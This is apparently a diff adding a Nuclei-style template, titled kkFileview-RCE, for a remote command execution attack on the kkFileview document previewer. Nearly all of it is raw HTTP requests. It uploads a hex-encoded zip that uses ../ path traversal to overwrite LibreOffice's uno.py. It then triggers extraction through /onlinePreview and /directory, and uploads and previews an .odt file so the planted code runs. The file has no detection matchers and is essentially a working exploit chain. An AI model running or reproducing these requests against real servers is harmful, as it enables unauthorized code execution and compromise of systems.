@@ -1,0 +1,83 @@
+id: kkFileview-RCE
+
+info:
+  name: kkFileview-RCE
+  author: 影域
+  severity: high
+  description: kkFileview远程命令执行
+
+
+
+http:
+  - raw:
+      - |
+        POST /fileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 620
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFwyngyRBOAfNeDbR
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=node01swdgc8rgsuggk4vktb1bx6ow0.node0
+        
+        ------WebKitFormBoundaryFwyngyRBOAfNeDbR
+        Content-Disposition: form-data; name="file"; filename="test.zip"
+        Content-Type: application/zip
+        
+        {{hex_decode("504b0304140000000800476b93580c7e7fd8060000000400000004000000746573742b492d2e0100504b0304140000000800476b9358b196b9964e000000520000005a0000002e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6f70742f6c696272656f6666696365372e352f70726f6772616d2f756e6f2e70792dc8310e80200c00c0ddc43f74125d0ac54894ff1071c036b689e1f72ede7857137e0c58c78115b5ab9536bbf72c06d54cb2f77444a4b423054c31a71068f356d4503a4c1348b7caf70a7fb9e503504b01021400140000000800476b93580c7e7fd8060000000400000004000000000000000000000080010000000074657374504b01021400140000000800476b9358b196b9964e000000520000005a00000000000000000000008001280000002e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6f70742f6c696272656f6666696365372e352f70726f6772616d2f756e6f2e7079504b05060000000002000200ba000000ee00000000000d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279464f43666237484d786158686e3044612d2d0d0a")}}
+
+        ------WebKitFormBoundaryFwyngyRBOAfNeDbR--
+
+      - |
+        GET /onlinePreview?url=aHR0cDovLzE5Mi4xNjguMTAuMTQ1OjgwMTIvZGVtby90ZXN0LnppcA%3D%3D HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=node01swdgc8rgsuggk4vktb1bx6ow0.node0
+      - |
+        GET /directory?urls=dGVzdC56aXBf HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=node01swdgc8rgsuggk4vktb1bx6ow0.node0
+
+      - |
+        POST /fileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 214
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBkRG9mgqrJuFpoa2
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=node01swdgc8rgsuggk4vktb1bx6ow0.node0
+        
+        ------WebKitFormBoundaryBkRG9mgqrJuFpoa2
+        Content-Disposition: form-data; name="file"; filename="ceshi1.odt"
+        Content-Type: application/vnd.oasis.opendocument.text
+        
+        t
+        ------WebKitFormBoundaryBkRG9mgqrJuFpoa2--
+      - |
+        GET /onlinePreview?url=aHR0cDovLzE5Mi4xNjguMTAuMTQ1OjgwMTIvZGVtby9jZXNoaTEub2R0 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=node01swdgc8rgsuggk4vktb1bx6ow0.node0
